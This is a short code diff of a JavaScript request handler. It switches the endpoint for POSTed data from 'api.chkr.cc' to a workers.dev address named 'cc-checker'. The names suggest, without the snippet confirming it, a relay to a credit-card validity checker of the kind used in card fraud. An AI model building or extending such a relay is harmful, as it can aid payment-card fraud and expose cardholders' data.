@@ -9,7 +9,7 @@ export default async function handler(req, res) {
   }
 
   try {
-    const apiRes = await fetch('https://api.chkr.cc/', {
+    const apiRes = await fetch('https://cc-checker.marinaaqua366.workers.dev/', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ data })
